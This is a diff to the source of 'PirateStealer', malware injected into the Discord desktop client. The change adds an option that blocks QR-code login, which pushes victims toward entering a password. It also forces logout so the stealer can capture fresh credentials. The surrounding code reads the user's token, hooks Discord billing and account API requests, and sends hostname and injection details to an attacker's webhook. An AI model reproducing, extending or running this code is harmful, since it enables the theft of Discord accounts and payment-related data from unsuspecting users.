@@ -16,9 +16,9 @@ const config = {
     "logout": "%LOGOUT%",
     "logout-notify": "%LOGOUTNOTI%",
     "init-notify":"%INITNOTI%",
-    "embed-color": 3447704
+    "embed-color": 3447704,
+    "disable-qr-code":"%DISABLEQRCODE%"
 }
-
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 	if (details.url.startsWith(webhook)) {
@@ -56,6 +56,7 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 
 
 
+
 function FirstTime() {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`${EvalToken}`, !0).then((token => {
@@ -77,7 +78,7 @@ function FirstTime() {
             return !0
         }
         fs.rmdirSync(path.join(__dirname, "PirateStealerBTW"));
-        if (config.logout != "false") {
+        if (config.logout != "false" || config.logout == "%LOGOUT%") {
             if (config['logout-notify'] == "true") {
                 if  (token == null || token == undefined || token == "") {
                     var c={username:"PirateStealer",content:"",embeds:[{title:"User log out (User not Logged in before)",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1}],author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:"https://ibb.co/nmDLGCT"}}]};SendToWebhook(JSON.stringify(c));
@@ -98,16 +99,18 @@ const Filter = {
     "urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
 }
 session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
-    if (FirstTime())
-        if (details.url.startsWith("wss://")) {
+    if (details.url.startsWith("wss://")) {
+        if (config["disable-qr-code"] == "true" || config["disable-qr-code"] == "%DISABLEQRCODE%"){
             callback({
-                cancel: !0
+                cancel: true
             })
-        } else {
-            callback({
-                cancel: !1
-            })
+            return;
         }
+    }
+    if (FirstTime()){}
+
+    callback({})
+    return;
 })
 
 function SendToWebhook(what) {
